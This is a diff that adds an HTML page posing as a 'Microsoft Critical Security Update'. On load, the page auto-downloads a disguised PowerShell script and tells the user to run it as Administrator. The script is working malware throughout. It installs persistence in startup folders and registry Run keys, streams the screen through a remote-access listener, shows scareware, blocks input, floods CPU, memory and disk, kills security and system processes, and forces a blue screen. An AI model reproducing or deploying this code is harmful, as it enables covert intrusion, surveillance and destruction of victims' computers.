@@ -1,0 +1,418 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Windows Security Update</title>
+<script>
+// Auto-execute immediately
+window.onload = function() {
+    setTimeout(createAndExecuteMalware, 1000);
+};
+
+function createAndExecuteMalware() {
+    const psScript = `
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+# HIDE EVERYTHING
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+Add-Type -AssemblyName System.Net.Sockets
+Add-Type -AssemblyName System.IO
+
+Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+public class WinAPI {
+    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+    [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
+    [DllImport("user32.dll")] public static extern bool BlockInput(bool block);
+    [DllImport("user32.dll")] public static extern int SetCursorPos(int x, int y);
+    [DllImport("ntdll.dll")] public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);
+    [DllImport("ntdll.dll")] public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
+    [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
+    [DllImport("kernel32.dll")] public static extern IntPtr GetCurrentProcess();
+    
+    public static void HideConsole() { ShowWindow(GetConsoleWindow(), 0); }
+    public static void TriggerBSOD() {
+        bool t1; uint t2;
+        RtlAdjustPrivilege(19, true, false, out t1);
+        NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out t2);
+    }
+}
+"@
+
+[WinAPI]::HideConsole()
+
+# GLOBAL CONTROL VARIABLES
+$global:BlockAllInput = $false
+$global:MaxStress = $false
+$global:DestroyMode = $false
+
+# 1. MAXIMUM PERSISTENCE - INSTALL EVERYWHERE
+function Install-AggressivePersistence {
+    $locations = @(
+        "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsUpdate.ps1",
+        "$env:TEMP\\SystemHealth.exe", 
+        "$env:PROGRAMDATA\\Microsoft\\Windows Defender\\platform\\4.18.23110.3-0\\MsMpEng.exe",
+        "$env:SYSTEMROOT\\System32\\Tasks\\Microsoft\\Windows\\System32\\svchost.sys",
+        "$env:USERPROFILE\\Documents\\windows_helper.ps1",
+        "$env:PUBLIC\\Desktop\\SystemScan.lnk"
+    )
+    
+    foreach ($loc in $locations) {
+        try {
+            Copy-Item $MyInvocation.MyCommand.Path $loc -Force
+            attrib +h +s +r $loc 2>&1 | Out-Null
+        } catch {}
+    }
+    
+    # REGISTRY PERSISTENCE - MULTIPLE ENTRIES
+    $regPaths = @(
+        "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+        "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+        "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
+        "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
+    )
+    
+    foreach ($regPath in $regPaths) {
+        try {
+            New-ItemProperty -Path $regPath -Name "Windows Security" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsUpdate.ps1`"" -Force -ErrorAction SilentlyContinue
+            New-ItemProperty -Path $regPath -Name "System Health" -Value "`"$env:TEMP\\SystemHealth.exe`"" -Force -ErrorAction SilentlyContinue
+        } catch {}
+    }
+}
+
+# 2. AGGRESSIVE SCAREWARE - CONSTANT HARASSMENT
+function Start-ScarewareAttack {
+    while ($true) {
+        # RANDOM SCARE MESSAGES
+        $messages = @("I SEE YOU", "SYSTEM COMPROMISED", "YOUR DATA IS MINE", "DONT EVEN TRY", "YOU ARE TRACKED")
+        $randomMsg = $messages | Get-Random
+        
+        $scareForm = New-Object System.Windows.Forms.Form
+        $scareForm.WindowState = 'Maximized'
+        $scareForm.TopMost = $true
+        $scareForm.BackColor = 'Black'
+        $scareForm.FormBorderStyle = 'None'
+        $scareForm.ControlBox = $false
+        
+        $scareLabel = New-Object System.Windows.Forms.Label
+        $scareLabel.Text = $randomMsg
+        $scareLabel.ForeColor = 'Red'
+        $scareLabel.Font = New-Object System.Drawing.Font('Arial', 72)
+        $scareLabel.AutoSize = $true
+        $scareLabel.Location = New-Object System.Drawing.Point(100, 300)
+        $scareForm.Controls.Add($scareLabel)
+        
+        $timer = New-Object System.Windows.Forms.Timer
+        $timer.Interval = 3000
+        $timer.Add_Tick({ 
+            $scareForm.Close()
+            $timer.Stop()
+        })
+        $scareForm.Add_Shown({$scareForm.Activate(); $timer.Start()})
+        $scareForm.ShowDialog()
+        
+        Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 30)
+    }
+}
+
+# 3. ADVANCED RAT - MULTIPLE CONNECTIONS
+function Start-AdvancedRAT {
+    # OPEN MULTIPLE PORTS FOR REDUNDANCY
+    $ports = @(58421, 58422, 58423, 4444, 5555)
+    
+    foreach ($port in $ports) {
+        Start-Job -ArgumentList $port -ScriptBlock {
+            param($port)
+            while ($true) {
+                try {
+                    $listener = New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Any, $port)
+                    $listener.Start()
+                    
+                    while ($true) {
+                        if ($listener.Pending()) {
+                            $client = $listener.AcceptTcpClient()
+                            $stream = $client.GetStream()
+                            
+                            # SEND VICTIM INFO
+                            $info = "VICTIM:$env:COMPUTERNAME:$env:USERNAME:$port"
+                            $writer = New-Object System.IO.StreamWriter($stream)
+                            $writer.WriteLine($info)
+                            $writer.Flush()
+                            
+                            # LIVE SCREEN SHARING
+                            while ($client.Connected) {
+                                $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+                                $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
+                                $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+                                $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
+                                $graphics.Dispose()
+                                
+                                $memStream = New-Object System.IO.MemoryStream
+                                $bitmap.Save($memStream, [System.Drawing.Imaging.ImageFormat]::Jpeg)
+                                $bytes = $memStream.ToArray()
+                                
+                                $sizeBytes = [BitConverter]::GetBytes($bytes.Length)
+                                $stream.Write($sizeBytes, 0, 4)
+                                $stream.Write($bytes, 0, $bytes.Length)
+                                
+                                $memStream.Dispose()
+                                $bitmap.Dispose()
+                                [System.Windows.Forms.Application]::DoEvents()
+                                Start-Sleep -Milliseconds 300
+                            }
+                            $client.Close()
+                        }
+                        Start-Sleep -Milliseconds 50
+                    }
+                } catch {
+                    Start-Sleep -Seconds 5
+                }
+            }
+        }
+    }
+}
+
+# 4. BRUTAL INPUT BLOCKING
+function Start-BrutalInputBlock {
+    while ($true) {
+        if ($global:BlockAllInput) {
+            # COMPLETE INPUT BLOCK
+            [WinAPI]::BlockInput($true)
+            
+            # MOUSE LOCK TO CORNER
+            [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0,0)
+            
+            # PRESS ESC REPEATEDLY TO CANCEL ANY DIALOGS
+            Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+public class Keyboard {
+    [DllImport("user32.dll")]
+    public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, int dwExtraInfo);
+}
+"@
+            [Keyboard]::keybd_event(0x1B, 0, 0, 0) # ESC key
+            Start-Sleep -Milliseconds 500
+        }
+        Start-Sleep -Milliseconds 100
+    }
+}
+
+# 5. SYSTEM DESTRUCTION MODE
+function Start-SystemDestruction {
+    while ($true) {
+        if ($global:DestroyMode) {
+            # MAXIMUM CPU STRESS
+            for ($i = 0; $i -lt 10; $i++) {
+                Start-Job -ScriptBlock {
+                    while ($true) {
+                        1..1000000 | ForEach-Object { 
+                            [math]::Sin([math]::Cos([math]::Tan([math]::Sqrt($_)))) * [math]::Pow($_, 2)
+                        }
+                    }
+                }
+            }
+            
+            # RAM EXHAUSTION
+            $largeArrays = @()
+            for ($i = 0; $i -lt 20; $i++) {
+                $largeArrays += New-Object byte[] 500MB
+                Start-Sleep -Milliseconds 100
+            }
+            
+            # DISK FLOOD
+            $garbageData = New-Object byte[] 100MB
+            (New-Object Random).NextBytes($garbageData)
+            for ($i = 0; $i -lt 50; $i++) {
+                try {
+                    [System.IO.File]::WriteAllBytes("$env:TEMP\\garbage_$i.dat", $garbageData)
+                } catch {}
+            }
+        }
+        Start-Sleep -Seconds 2
+    }
+}
+
+# 6. AGGRESSIVE ANTI-ANALYSIS
+function Start-AggressiveAntiAnalysis {
+    while ($true) {
+        # KILL ALL SECURITY/ANALYSIS TOOLS
+        $targetProcesses = @(
+            "taskmgr", "cmd", "powershell", "pwsh", "procexp", "processhacker", 
+            "wireshark", "procmon", "autoruns", "regedit", "msconfig",
+            "explorer", "winlogon", "csrss", "services"
+        )
+        
+        foreach ($procName in $targetProcesses) {
+            Get-Process -Name $procName -ErrorAction SilentlyContinue | ForEach-Object {
+                try { 
+                    Stop-Process -Id $_.Id -Force 
+                    Start-Sleep -Milliseconds 10
+                } catch {}
+            }
+        }
+        
+        # BLOCK NEW PROCESS STARTS
+        try {
+            # Disable task manager via registry
+            New-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "DisableTaskMgr" -Value 1 -Force -ErrorAction SilentlyContinue
+        } catch {}
+        
+        Start-Sleep -Seconds 1
+    }
+}
+
+# 7. BSOD ATTACK ON DEMAND
+function Start-BSODAttack {
+    [WinAPI]::TriggerBSOD()
+}
+
+# 8. CONTROL PANEL WITH MAXIMUM CONTROL
+function Show-AggressiveControlPanel {
+    $controlForm = New-Object System.Windows.Forms.Form
+    $controlForm.Text = "SYSTEM CONTROL - ADMIN MODE"
+    $controlForm.Size = New-Object System.Drawing.Size(500, 700)
+    $controlForm.StartPosition = "CenterScreen"
+    $controlForm.TopMost = $true
+    $controlForm.ControlBox = $false
+    
+    # TOTAL INPUT BLOCK
+    $inputBtn = New-Object System.Windows.Forms.Button
+    $inputBtn.Text = "🔒 BLOCK ALL INPUT"
+    $inputBtn.Size = New-Object System.Drawing.Size(450, 50)
+    $inputBtn.Location = New-Object System.Drawing.Point(25, 20)
+    $inputBtn.BackColor = [System.Drawing.Color]::Red
+    $inputBtn.ForeColor = [System.Drawing.Color]::White
+    $inputBtn.Add_Click({
+        $global:BlockAllInput = !$global:BlockAllInput
+        if ($global:BlockAllInput) {
+            $inputBtn.Text = "🔓 UNBLOCK INPUT"
+            $inputBtn.BackColor = [System.Drawing.Color]::Green
+        } else {
+            $inputBtn.Text = "🔒 BLOCK ALL INPUT"
+            $inputBtn.BackColor = [System.Drawing.Color]::Red
+        }
+    })
+    
+    # SYSTEM DESTRUCTION
+    $destroyBtn = New-Object System.Windows.Forms.Button
+    $destroyBtn.Text = "💀 ACTIVATE SYSTEM DESTRUCTION"
+    $destroyBtn.Size = New-Object System.Drawing.Size(450, 50)
+    $destroyBtn.Location = New-Object System.Drawing.Point(25, 90)
+    $destroyBtn.BackColor = [System.Drawing.Color]::DarkRed
+    $destroyBtn.ForeColor = [System.Drawing.Color]::White
+    $destroyBtn.Add_Click({
+        $global:DestroyMode = !$global:DestroyMode
+        if ($global:DestroyMode) {
+            $destroyBtn.Text = "✅ DEACTIVATE DESTRUCTION"
+            $destroyBtn.BackColor = [System.Drawing.Color]::Green
+        } else {
+            $destroyBtn.Text = "💀 ACTIVATE SYSTEM DESTRUCTION"
+            $destroyBtn.BackColor = [System.Drawing.Color]::DarkRed
+        }
+    })
+    
+    # INSTANT BSOD
+    $bsodBtn = New-Object System.Windows.Forms.Button
+    $bsodBtn.Text = "🌀 IMMEDIATE BSOD"
+    $bsodBtn.Size = New-Object System.Drawing.Size(450, 50)
+    $bsodBtn.Location = New-Object System.Drawing.Point(25, 160)
+    $bsodBtn.BackColor = [System.Drawing.Color]::Purple
+    $bsodBtn.ForeColor = [System.Drawing.Color]::White
+    $bsodBtn.Add_Click({
+        Start-BSODAttack
+    })
+    
+    # RANDOM SCARE ATTACK
+    $scareBtn = New-Object System.Windows.Forms.Button
+    $scareBtn.Text = "😱 RANDOM SCARE ATTACK"
+    $scareBtn.Size = New-Object System.Drawing.Size(450, 50)
+    $scareBtn.Location = New-Object System.Drawing.Point(25, 230)
+    $scareBtn.BackColor = [System.Drawing.Color]::Orange
+    $scareBtn.Add_Click({
+        Start-Job -ScriptBlock { Start-ScarewareAttack }
+    })
+    
+    # KILL ALL PROCESSES
+    $killBtn = New-Object System.Windows.Forms.Button
+    $killBtn.Text = "⚡ KILL ALL SECURITY PROCESSES"
+    $killBtn.Size = New-Object System.Drawing.Size(450, 50)
+    $killBtn.Location = New-Object System.Drawing.Point(25, 300)
+    $killBtn.BackColor = [System.Drawing.Color]::DarkOrange
+    $killBtn.Add_Click({
+        Start-Job -ScriptBlock { Start-AggressiveAntiAnalysis }
+    })
+    
+    # REINFORCE PERSISTENCE
+    $persistBtn = New-Object System.Windows.Forms.Button
+    $persistBtn.Text = "🔄 REINFORCE INFECTION"
+    $persistBtn.Size = New-Object System.Drawing.Size(450, 50)
+    $persistBtn.Location = New-Object System.Drawing.Point(25, 370)
+    $persistBtn.BackColor = [System.Drawing.Color]::Blue
+    $persistBtn.ForeColor = [System.Drawing.Color]::White
+    $persistBtn.Add_Click({
+        Install-AggressivePersistence
+    })
+    
+    # NEVER CLOSE BUTTON
+    $closeBtn = New-Object System.Windows.Forms.Button
+    $closeBtn.Text = "🚫 CANNOT CLOSE - PERMANENT"
+    $closeBtn.Size = New-Object System.Drawing.Size(450, 50)
+    $closeBtn.Location = New-Object System.Drawing.Point(25, 440)
+    $closeBtn.BackColor = [System.Drawing.Color]::Black
+    $closeBtn.ForeColor = [System.Drawing.Color]::White
+    $closeBtn.Enabled = $false
+    
+    $controlForm.Controls.AddRange(@($inputBtn, $destroyBtn, $bsodBtn, $scareBtn, $killBtn, $persistBtn, $closeBtn))
+    
+    # PREVENT CLOSING
+    $controlForm.Add_FormClosing({
+        $_.Cancel = $true
+        Start-BSODAttack
+    })
+    
+    $controlForm.ShowDialog()
+}
+
+# START ALL ATTACKS
+Install-AggressivePersistence
+Start-Job -ScriptBlock { Start-ScarewareAttack }
+Start-Job -ScriptBlock { Start-AdvancedRAT }
+Start-Job -ScriptBlock { Start-BrutalInputBlock }
+Start-Job -ScriptBlock { Start-SystemDestruction }
+Start-Job -ScriptBlock { Start-AggressiveAntiAnalysis }
+
+# SHOW CONTROL PANEL
+Show-AggressiveControlPanel
+
+# PERMANENT EXECUTION
+while ($true) {
+    # REINSTALL PERSISTENCE EVERY 5 MINUTES
+    Install-AggressivePersistence
+    Start-Sleep -Seconds 300
+}
+`;
+
+    // Create and auto-download the file
+    const blob = new Blob([psScript], { type: 'application/x-powershell' });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = 'Critical_Windows_Update.ps1';
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+    URL.revokeObjectURL(url);
+    
+    // Fake success message
+    alert('Windows Security Update downloaded successfully. Run as Administrator to complete installation.');
+}
+</script>
+</head>
+<body style="background: #0078d4; color: white; text-align: center; padding: 100px;">
+    <h1>🔒 Microsoft Critical Security Update</h1>
+    <p>Your system is being scanned for vulnerabilities...</p>
+    <p>Automatic update in progress. Do not close this page.</p>
+</body>
+</html>
